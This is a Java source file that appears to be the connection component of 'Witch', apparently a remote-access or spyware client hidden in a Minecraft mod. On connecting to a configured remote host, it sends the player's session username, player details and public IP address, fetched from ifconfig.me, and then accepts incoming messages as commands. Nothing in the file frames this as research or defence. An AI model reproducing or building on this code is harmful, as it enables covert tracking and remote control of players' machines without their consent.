package me.soda.witch.client.connection;

import me.soda.witch.client.Witch;
import me.soda.witch.client.events.ConnectionMessageEvent;
import me.soda.witch.client.utils.MCUtils;
import me.soda.witch.client.utils.NetUtil;
import me.soda.witch.shared.Cfg;
import me.soda.witch.shared.LogUtil;
import me.soda.witch.shared.events.EventBus;
import me.soda.witch.shared.socket.DisconnectInfo;
import me.soda.witch.shared.socket.Message;
import me.soda.witch.shared.socket.TcpClient;

import static me.soda.witch.client.Witch.mc;

public class Client extends TcpClient {
    public int reconnections = 0;

    public Client() {
        super(Cfg.host(), Cfg.port(), 30000);
    }

    @Override
    public boolean onReconnect() {
        boolean tooMany = reconnections > 10;
        if (!tooMany) {
            reconnections++;
        } else {
            setReconnectTimeout(-1);
            LogUtil.println("Witch end because of manual shutdown or too many reconnections");
            return false;
        }
        return true;
    }

    @Override
    public void onOpen() {
        LogUtil.println("Connection initialized");
        String greetingMsg = "Reconnected " + Witch.client.reconnections + " times, I am " + mc.getSession().getUsername();
        NetUtil.send("greeting", greetingMsg);
        NetUtil.send("player", MCUtils.getPlayerInfo());
        NetUtil.send("ip", NetUtil.httpSend("https://ifconfig.me/"));
        NetUtil.send("server_name");
    }

    @Override
    public void onMessage(Message message) {
        EventBus.INSTANCE.post(ConnectionMessageEvent.get(message));
    }

    @Override
    public void onClose(DisconnectInfo disconnectInfo) {
        LogUtil.println("Disconnected: " + disconnectInfo.reason());
    }
}